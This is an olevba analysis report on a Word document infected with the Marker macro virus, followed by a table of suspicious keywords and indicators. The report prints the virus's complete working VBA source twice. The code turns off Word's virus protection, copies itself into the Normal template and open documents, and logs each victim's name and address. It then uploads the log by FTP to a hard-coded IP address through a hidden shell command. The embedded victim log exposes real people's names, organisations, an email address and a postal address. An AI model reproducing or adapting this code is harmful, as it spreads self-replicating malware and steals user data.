olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker-based-460b9549adbf8ba45d2573d35d8596e557a71498
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker-based-460b9549adbf8ba45d2573d35d8596e557a71498 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is a marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    For i = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next i
    LogFile = "C:\hsf" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
    
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 09:08:36  - Saturday, 28 Nov 1998
' SPo0Ky
' Blue Planet
'



' 02:50:31 PM - Saturday, 28 Nov 1998
' MARK B. SEAY
'



' 08:04:45 AM - Friday, 4 Dec 1998
' UPS
'



' 11:43:35 AM - Thursday, 17 Dec 1998
' WRO
'



' 10:42:25 AM - Wednesday, 23 Dec 1998
' BCBSA
'



' 02:25:08 PM - Wednesday, 23 Dec 1998
' BCBSA
'



' 01:28:09 PM - Tuesday, 5 Jan 1999
' BCBSA
'



' 06:56:46 PM - Monday, 11 Jan 1999
' Kay Helgerson
'



' 06:01:43 PM - Tuesday, 26 Jan 1999
' Ayenda M. Lambert
'



' 09:06:30 AM - Monday, 1 Feb 1999
' Dee Carr
'



' 11:49:14  - torsdag, 4 feb 1999
' Henrik Hansen
'



' 03:45:07  - mandag, 8 feb 1999
' JPW pĺ PC2333
'



' 08:23:50  - onsdag, 10 feb 1999
' RHG pĺ PC1439
'



' 11:27:32  - onsdag, 10 feb 1999
' CBB pĺ PC0688
'



' 11:27:38  - torsdag, 11 feb 1999
' PLN pĺ PC1723
'



' 03:13:28  - mandag, 15 feb 1999
' TRJ pĺ PC2308
'



' 01:52:51  - piątek, 19 II 1999
' Jacek Spychalski
' jacek.spychalski@centertel.pl



' 09:40:06  - czwartek, 11 mar 1999
' MF
'



' 11:46:49  - piątek, 12 mar 1999
' OPTIMUS
'



' 03:09:16  - piątek, 26 mar 1999
' Kwiatkowski
'



' 12:12:05  - poniedziałek, 29 mar 1999
' PiotrowskiM
'



' 06:28:17  - czwartek, 20 maj 1999
' Agnieszka i Marek
'



' 08:07:31  - wtorek, 28 wrz 1999
' Tomkos
'


Private Sub Document_Close1()

On Error Resume Next

Const Marker = "<- this is a marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    For i = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next i
    LogFile = "C:\hsf" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
    
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 09:08:36  - Saturday, 28 Nov 1998
' SPo0Ky
' Blue Planet
'



' 02:50:31 PM - Saturday, 28 Nov 1998
' MARK B. SEAY
'



' 08:04:45 AM - Friday, 4 Dec 1998
' UPS
'



' 11:43:35 AM - Thursday, 17 Dec 1998
' WRO
'



' 10:42:25 AM - Wednesday, 23 Dec 1998
' BCBSA
'



' 02:25:08 PM - Wednesday, 23 Dec 1998
' BCBSA
'



' 01:28:09 PM - Tuesday, 5 Jan 1999
' BCBSA
'



' 06:56:46 PM - Monday, 11 Jan 1999
' Kay Helgerson
'



' 06:01:43 PM - Tuesday, 26 Jan 1999
' Ayenda M. Lambert
'



' 09:06:30 AM - Monday, 1 Feb 1999
' Dee Carr
'



' 11:49:14  - torsdag, 4 feb 1999
' Henrik Hansen
'



' 03:45:07  - mandag, 8 feb 1999
' JPW pĺ PC2333
'



' 08:23:50  - onsdag, 10 feb 1999
' RHG pĺ PC1439
'



' 11:27:32  - onsdag, 10 feb 1999
' CBB pĺ PC0688
'



' 11:27:38  - torsdag, 11 feb 1999
' PLN pĺ PC1723
'



' 03:13:28  - mandag, 15 feb 1999
' TRJ pĺ PC2308
'



' 01:52:51  - piątek, 19 II 1999
' Jacek Spychalski
' jacek.spychalski@centertel.pl



' 09:40:06  - czwartek, 11 mar 1999
' MF
'



' 11:46:49  - piątek, 12 mar 1999
' OPTIMUS
'



' 03:09:16  - piątek, 26 mar 1999
' Kwiatkowski
'



' 12:12:05  - poniedziałek, 29 mar 1999
' PiotrowskiM
'



' 06:28:17  - czwartek, 20 maj 1999
' Agnieszka i Marek
'



' 08:07:31  - wtorek, 28 wrz 1999
' Tomkos
'



' 08:46:56  - wtorek, 28 wrz 1999
' Tomkos
'


'Tomkos Loves Nicky F. Also! 99-09-28 21:18:38


'Jerzy Gach Loves Nicky F. Also! 99-10-19 07:58:08


'CMIU Loves Nicky F. Also! 99-11-03 08:06:02



' 05:56:07 WILU - niedziela, 7 lis 1999
' Maciek Wilk
'



' 01:13:26  - środa, 12 I 2000
' PKP
'


'PKP Loves Nicky F. Also! 2000-02-25 08:00:57



' 10:33:26  - wtorek, 7 III 2000
' PKP
'



' 02:01:41  - środa, 8 mar 2000
' PKP-CM
'



' 02:32:22  - środa, 29 III 2000
' PKP
'



' 08:30:34  - piątek, 21 kwi 2000
' PKP-CM
'



' 11:38:57  - piątek, 19 maj 2000
' PKP-CM
'



' 12:05:12  - czwartek, 1 cze 2000
' PKP-CM
'



' 02:51:29  - piątek, 13 paź 2000
' PKP
'



' 12:42:29  - poniedziałek, 23 paź 2000
' CMP1
'



' 01:33:20  - środa, 6 gru 2000
' CMP1
'



' 12:50:44  - środa, 20 gru 2000
' Beata Ciechanowska
'              PKP
'       Zakład Taboru
'      ul. Marynarska 1
'      70-612 Szczecin
'   CMPR1c-101/91/00
'



' 01:57:55  - środa, 17 sty 2001
' xLaskowska  Bożenna
'



' 08:47:39  - środa, 18 lip 2001
' UMiG Barlinek
'



' 04:36:03  - środa, 21 lis 2001
' UMiG
'



' 02:27:09  - piątek, 19 kwi 2002
' teresa
'



' 12:26:55  - środa, 24 kwi 2002
' teresa
'



Private Sub Image1_Click()

End Sub
' 10:35:46  - wtorek, 1 paź 2002
' teresa
'



' 07:54:29  - piątek, 10 paź 2003
' teresa
'



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Image1_Click        |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

